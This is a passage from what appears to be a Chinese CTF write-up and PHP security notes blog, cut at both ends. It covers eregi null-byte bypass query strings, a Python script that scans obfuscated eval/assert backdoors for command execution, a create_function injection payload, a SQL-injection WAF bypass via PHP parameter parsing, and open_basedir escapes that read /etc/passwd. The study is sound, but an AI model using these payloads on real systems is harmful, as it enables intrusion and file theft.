</p></li><li><p><strong>第三层</strong>：因为是 PHP5，且 <code>eregi</code> 存在 <code>00</code> 截断可以直接绕过</p></li><li><p>所以可以构造如下 URL：<br><code>?foo=&#123;&quot;bar1&quot;:&quot;2022asd&quot;,&quot;bar2&quot;:[[0],2,3,4,5],&quot;a2&quot;:&quot;me7eorite&quot;&#125;&amp;cat[1][]=&quot;1&quot;&amp;dog=what&amp;cat[0]=%00me7e2021</code></p></li></ul><hr><h2 id="代码混淆-强网杯-2019-高明的黑客"><a href="#代码混淆-强网杯-2019-高明的黑客" class="headerlink" title="代码混淆 (强网杯 2019 - 高明的黑客)"></a>代码混淆 (强网杯 2019 - 高明的黑客)</h2><ul><li><p>首页提示了源码泄露，下载下来后发现有 3000 多个文件，而且文件中有 <code>eval</code> 还有 <code>assert</code>，但是有些没有执行命令的功能，似乎是被混淆了。</p></li><li><p>通过编写一个脚本遍历这些 <code>eval</code> 和 <code>assert</code> 方法找到一个能够执行命令的功能。exp 如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;start：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))<br><br>s1 = threading.Semaphore(<span class="hljs-number">100</span>)                                           <br>filePath = <span class="hljs-string">r&quot;H:\Programmar\phpstudy_pro\WWW\src&quot;</span><br>os.chdir(filePath)                                                    <br>requests.adapters.DEFAULT_RETRIES = <span class="hljs-number">5</span>                             <br>files = os.listdir(filePath)<br>session = requests.Session()<br>session.keep_alive = <span class="hljs-literal">False</span>                                           <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_content</span>(<span class="hljs-params">file</span>):<br>    s1.acquire()                                                <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;trying   &#x27;</span>+file+ <span class="hljs-string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:                            <br>        gets = <span class="hljs-built_in">list</span>(re.findall(<span class="hljs-string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))<br>        posts = <span class="hljs-built_in">list</span>(re.findall(<span class="hljs-string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))<br>    data = &#123;&#125;                                                     <br>    params = &#123;&#125;                                                       <br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> gets:<br>        params[m] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> posts:<br>        data[n] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br>    url = <span class="hljs-string">&#x27;http://101.43.122.252:8004/&#x27;</span>+file<br>    req = session.post(url, data=data, params=params)          <br>    req.close()                                                <br>    req.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br>    content = req.text<br>    <span class="hljs-comment">#print(content)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:                                    <br>        flag = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> gets:<br>            req = session.get(url+<span class="hljs-string">&#x27;?%s=&#x27;</span>%a+<span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)<br>            content = req.text<br>            req.close()                                              <br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:<br>                flag = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag != <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> posts:<br>                req = session.post(url, data=&#123;b:<span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)<br>                content = req.text<br>                req.close()                                               <br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:                                                   <br>            param = a<br>        <span class="hljs-keyword">else</span>:<br>            param = b<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;file: &#x27;</span>+file+<span class="hljs-string">&quot;  and param:%s&quot;</span> %param)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;endtime: &#x27;</span> + time.asctime(time.localtime(time.time())))<br>    s1.release()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> files:                                                            <br>    t = threading.Thread(target=get_content, args=(i,))<br>    t.start()<br></code></pre></td></tr></table></figure><ul><li>替换脚本中的地址为本地 PHP 解压后的地址，修改 URL 地址方便测试能够执行命令。</li></ul><p><img src="/WritenUp.assets%5Cimage-20220529013728647.png" alt="image-20220529013728647"></p><ul><li>因为写的是多线程会出现无法中断的情况，需要留意一下这个文件。</li></ul><p><img src="/WritenUp.assets%5Cimage-20220529013509303.png" alt="image-20220529013509303"></p><ul><li>然后再题目环境中执行命令查看 <code>flag.txt</code> 获取到 flag</li></ul><p><img src="/WritenUp.assets%5Cimage-20220529014035445.png" alt="image-20220529014035445"></p><p><code>flag&#123;this_is_smart_hacker_flag&#125;</code></p><hr><h2 id="small-tips："><a href="#small-tips：" class="headerlink" title="small tips："></a>small tips：</h2><ul><li><code>100.0010</code> 正和反值相等但并非是回文序列</li><li><code>get&#123;var]</code>  ?var[变量名]  ?var[template][tp1]&#x3D;xxx&amp;var[template][tp2]&#x3D;xxx  数组 template 中的 tp1<ul><li>var[]&#x3D;aaaa 默认传了 var[0]&#x3D;aaaa</li><li>通过变量覆盖<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br></code></pre></td></tr></table></figure>传 <code>flag[arg]=&#125;var_dump(get_defined_vars());//&amp;flag[code]=create_function</code></li></ul></li></ul><hr><h2 id="PHP-特性"><a href="#PHP-特性" class="headerlink" title="PHP 特性"></a>PHP 特性</h2><ol><li><p>我们知道 PHP 将查询字符串（在 URL 或正文中）转换为内部 <code>$=GET</code> 或的关联数组 <code>$_POST</code>。例如：<code>/?foo=bar</code> 变成 <code>Array([foo] =&gt; &quot;bar&quot;)</code>。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，<code>/?%20news[id%00=42</code> 会转换为 <code>Array([news_id] =&gt; 42)</code>。如果一个 IDS&#x2F;IPS 或 WAF 中有一条规则是当 <code>news_id</code> 参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/news.php?%<span class="hljs-number">20</span>news[id%<span class="hljs-number">00</span>=<span class="hljs-number">42</span><span class="hljs-string">&quot;+AND+1=0--</span><br></code></pre></td></tr></table></figure><ul><li><p>上述 PHP 语句的参数 <code>%20news[id%00</code> 的值将存储到 <code>$_GET[&quot;news_id&quot;]</code> 中。</p></li><li><p>PHP 需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p><ol><li>删除空白符</li><li>将某些字符转换为下划线（包括空格）<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">%<span class="hljs-number">20</span>foo_bar%<span class="hljs-number">00</span>                            foo_bar                            foo_bar           <br>foo%<span class="hljs-number">20</span>bar%<span class="hljs-number">00</span>                      foo bar                    foo_bar         <br>foo%<span class="hljs-number">5</span>bbar                            foo[bar                          foo_bar     <br></code></pre></td></tr></table></figure></li></ol></li><li><p><code>?%20num=var_dump(scandir(chr(47)))</code></p></li><li><p><code>$_SERVER[&#39;PHP_SELF&#39;]</code> 表示当前 php 文件相对于网站根目录的位置地址，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//www.5idev.com/php/ ：/php/index.php</span><br>http:<span class="hljs-comment">//www.5idev.com/php/index.php ：/php/index.php</span><br>http:<span class="hljs-comment">//www.5idev.com/php/index.php?test=foo ：/php/index.php</span><br>http:<span class="hljs-comment">//www.5idev.com/php/index.php/test/foo ：/php/index.php/test/foo</span><br></code></pre></td></tr></table></figure><ul><li><code>basename</code> 则是返回路径中的文件名部分。但是 basename 有个特性，如果文件名是一个不可见字符，便会将上一个目录作为返回值。比如：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br></code></pre></td></tr></table></figure></li><li><code>basename</code> 例子：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$var1</span>=<span class="hljs-string">&quot;/config.php/test&quot;</span><br><span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$var1</span>)=&gt; test<br><span class="hljs-variable">$var2</span>=<span class="hljs-string">&quot;/config.php/%ff&quot;</span><br><span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$var2</span>)=&gt;config.php<br></code></pre></td></tr></table></figure></li><li>当我们访问一个 <code>存在的文件/不存在的文件</code> 这个 URL 时，php 会自动忽略多余的不存在的部分，比如下面两种 URL：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/index.php<br>/index.php/dosent_exist.php<br></code></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><code>include</code> 有一个很有趣的特性：</p></li></ol><ul><li>如果参数中包含 <code>../</code> 这样的路径，解析器则会忽略 <code>../</code> 之前的字符串而去在当前目录的父目录下寻找文件<ul><li>这意味着我们只要在想要查看的文件路径中使用 <code>../</code> 这类路径，<code>include</code> 就会自动忽略前面的内容，这样真正包含的文件名就是有效的了。一点一点试就可以得到正确的路径了。</li></ul></li></ul><ol start="3"><li><strong>CURLOPT_POSTFIELDS</strong></li></ol><ul><li>全部数据使用 HTTP 协议中的 “POST” 操作来发送。</li></ul><p>要发送文件，在文件名前面加上 <code>@</code> 前缀并使用完整路径。 文件类型可在文件名后以 <code>;type=mimetype</code> 的格式指定。这个参数可以是 <code>urlencoded</code> 后的字符串，类似 <code>&#39;para1=val1&amp;para2=val2&amp;...&#39;</code>，也可以使用一个以字段名为键值，字段数据为值的数组。如果 <code>value</code> 是一个数组，<code>Content-Type</code> 头将会被设置成 <code>multipart/form-data</code>。从 PHP 5.2.0 开始，使用 <code>@</code> 前缀传递文件时，<code>value</code> 必须是个数组。从 PHP 5.5.0 开始, <code>@</code> 前缀已被废弃，文件可通过 <code>CURLFile</code> 发送。设置 <code>CURLOPT_SAFE_UPLOAD</code> 为 <code>true</code> 可禁用 <code>@</code> 前缀发送文件，以增加安全性。</p><ul><li><p><strong>CURLOPT_SAFE_UPLOAD</strong></p></li><li><p>默认 <code>true</code>。禁用 <code>@</code> 前缀在 <code>CURLOPT_POSTFIELDS</code> 中发送文件。意味着 <code>@</code> 可以在字段中安全地使用了。可使用 <code>CURLFile</code> 作为上传的代替。</p></li><li><p>PHP 5.5.0 中添加，默认值 <code>false</code>。 PHP 5.6.0 改默认值为 <code>true</code>。PHP 7 删除了此选项， 必须使用 <code>CURLFile</code> interface 来上传文件。</p></li><li><p>@ 符号出现了。这里的意思就是如果 <code>CURLOPT_SAFE_UPLOAD</code> 为 <code>False</code>，那么在 <code>CURLOPT_POSTFIELDS</code> 要发送的文件名前面加上 <code>@</code> 就可以使用完整路径读取文件了。此时问题又来到了经典的文件任意读取。问题是，读取啥文件呢？我们现在完全不知道 <code>flag</code> 文件在哪。</p></li></ul><hr><h2 id="上传还读取"><a href="#上传还读取" class="headerlink" title="上传还读取"></a>上传还读取</h2><ol><li><strong>无参函数可接受参数</strong></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">a</span>(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>);<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>命名空间</strong></li></ol><ul><li>可以简单地理解为一个“文件夹”或“目录”，它用来组织和管理代码中的类、函数、常量等元素，避免名称冲突。</li><li>命名空间 A 和命名空间 B 就像是两个文件夹，每个文件夹里都有一个名为 <code>sayHello()</code> 的函数。由于它们处于不同的命名空间（文件夹）中，所以函数不会互相冲突。</li><li>当你在 PHP 脚本中不指定命名空间时，代码运行在全局命名空间中。PHP 不允许在全局命名空间中重写内置函数（如 <code>sha1()</code>）。</li><li>命名空间的声明方式有两种：<strong>封闭命名空间</strong> 和 <strong>开放命名空间</strong>。你提到的 <code>namespace interesting;</code> 是 <strong>开放命名空间</strong> 的一种声明方式，它不需要使用 <code>&#123;&#125;</code> 包围代码块。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">test1</span>&#123;<br><span class="hljs-title class_">function</span> <span class="hljs-title class_">a</span>()&#123;<br><span class="hljs-title class_">echo</span> &#x27;<span class="hljs-title class_">a</span>&#x27;;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">test2</span>&#123;<br><span class="hljs-title class_">function</span> <span class="hljs-title class_">b</span>()&#123;<br><span class="hljs-title class_">echo</span> &#x27;<span class="hljs-title class_">b</span>&#x27;;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">phpinfo</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;phpinfo changed&#x27;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-keyword">namespace</span>&#123;<br>\<span class="hljs-title class_">test1</span>\<span class="hljs-title class_">a</span>(); <span class="hljs-comment"># 输出: a</span><br>\test2\<span class="hljs-title function_ invoke__">b</span>(); <span class="hljs-comment"># 输出: b</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>php 里默认命名空间是 <code>\</code>，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名 <code>function_name()</code> 调用，调用的时候其实相当于写了一个相对路径；而如果写 <code>\function_name()</code> 这样调用函数，则其实是写了一个绝对路径。</li><li>如果你在其他 namespace 里调用系统类，就必须写绝对路径这种写法。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">MyNamespace</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">phpinfo</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Custom phpinfo in MyNamespace&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">phpinfo</span>();  <span class="hljs-comment">// 调用 MyNamespace\phpinfo()，输出 &quot;Custom phpinfo in MyNamespace&quot;</span><br>\<span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-comment">// 调用全局命名空间中的 phpinfo()，输出 PHP 配置信息</span><br></code></pre></td></tr></table></figure><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$action</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$arg</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;arg&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class="hljs-variable">$action</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$action</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>传 <code>\create_function</code></li></ul><ol start="3"><li><strong>匿名函数</strong></li></ol><ul><li>变量赋值示例<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$greet</span> = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;Hello %s\r\n&quot;</span>, <span class="hljs-variable">$name</span>);<br>&#125;;<br><br><span class="hljs-variable">$greet</span>(<span class="hljs-string">&#x27;World&#x27;</span>);<br><span class="hljs-variable">$greet</span>(<span class="hljs-string">&#x27;PHP&#x27;</span>);<br></code></pre></td></tr></table></figure></li><li>回调函数对匿名函数的调用<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace_callback</span>(<span class="hljs-string">&#x27;~-([a-z])~&#x27;</span>, function (<span class="hljs-variable">$match</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$match</span>[<span class="hljs-number">1</span>]);<br>&#125;, <span class="hljs-string">&#x27;hello-world&#x27;</span>);<br><span class="hljs-comment">// 输出 helloWorld</span><br></code></pre></td></tr></table></figure></li><li>使用 <code>USE</code> 闭包</li><li>可以从父作用域中继承变量。 任何此类变量都应该用 <code>use</code> 语言结构传递进去。 <code>PHP7.1</code> 起，不能传入此类变量：<code>superglobals</code>、<code>$this</code> 或者和参数重名。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;hello&#x27;</span>;<br><br><span class="hljs-variable">$example</span> = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$message</span>);<br>&#125;;<br><span class="hljs-comment">#echo $example();  // Notice: Undefined variable: message </span><br><br><span class="hljs-variable">$example</span> = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) <span class="hljs-keyword">use</span> (<span class="hljs-params"><span class="hljs-variable">$message</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$message</span>);<br>&#125;;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$example</span>();  <span class="hljs-comment">// string(5) &quot;hello&quot;</span><br><br><br><span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;world&#x27;</span>; <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$example</span>();   <span class="hljs-comment">//string(5) &quot;hello&quot;</span><br><br><span class="hljs-variable">$example</span> = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) <span class="hljs-keyword">use</span> (<span class="hljs-params"><span class="hljs-variable">$message</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$arg</span> . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$message</span>);<br>&#125;;<br><span class="hljs-variable">$example</span>(<span class="hljs-string">&quot;hello&quot;</span>);   <span class="hljs-comment">// string(11) &quot;hello world&quot;</span><br></code></pre></td></tr></table></figure></li></ul><ol start="4"><li><strong>open_basedir</strong></li></ol><ul><li><p>是 PHP 中的一个配置选项，用于限制脚本可以访问的文件系统路径范围。</p></li><li><p>例子 <code>open_basedir = /var/www/html/:/tmp/</code>   PHP 脚本只能访问 <code>/var/www/html/</code> 目录及其子目录，和 <code>/tmp/</code> 目录。</p></li><li><p>php.ini 文件中设置 <code>open_basedir</code> 选项。</p></li><li><p><strong>绕过方法</strong>：</p><ul><li>利用 <code>ini_set</code> 和 <code>chdir</code>，PHP 配置中未禁用 <code>ini_set</code> 的使用。</li></ul><p>参考：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;subDir&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><ul><li><strong>利用 <code>symlink</code></strong><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g/&#x27;</span>,<span class="hljs-number">0777</span>,<span class="hljs-literal">TRUE</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;/var/www/html/a/b/c/d/e/f/g&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html:bar/&#x27;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;foo/../../../../../../&#x27;</span>,<span class="hljs-string">&#x27;bar&#x27;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;/var/www/html&#x27;</span>,<span class="hljs-string">&#x27;foo&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;bar/etc/passwd&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ul></li></ul><ol start="5"><li><strong>PHP 是一门动态语言</strong></li></ol><ul><li>动态语言指在运行时确定数据类型的语言，它拥有一些独特的特性如：动态变量、动态函数执行等。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-string">&#x27;cc&#x27;</span>;<br><span class="hljs-comment">#$a 是 $_GET 的中间变量，$_GET 是最终变量</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;_GET&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$$a</span>); <span class="hljs-comment">//第一个$是找到$a是_GET第二个是找到$_GET 想$this</span><br><br><span class="hljs-variable">$_POST</span> = <span class="hljs-string">&#x27;asdf&#x27;</span>;<br><span class="hljs-variable">$asdf</span> = <span class="hljs-string">&#x27;ccc&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$$_POST</span>);<br></code></pre></td></tr></table></figure><ul><li><p><strong>可变属性名</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$bar</span> = <span class="hljs-string">&#x27;I am bar.&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;I am A.&#x27;</span>, <span class="hljs-string">&#x27;I am B.&#x27;</span>, <span class="hljs-string">&#x27;I am C.&#x27;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$r</span>   = <span class="hljs-string">&#x27;I am r.&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$foo</span> = <span class="hljs-keyword">new</span> <span 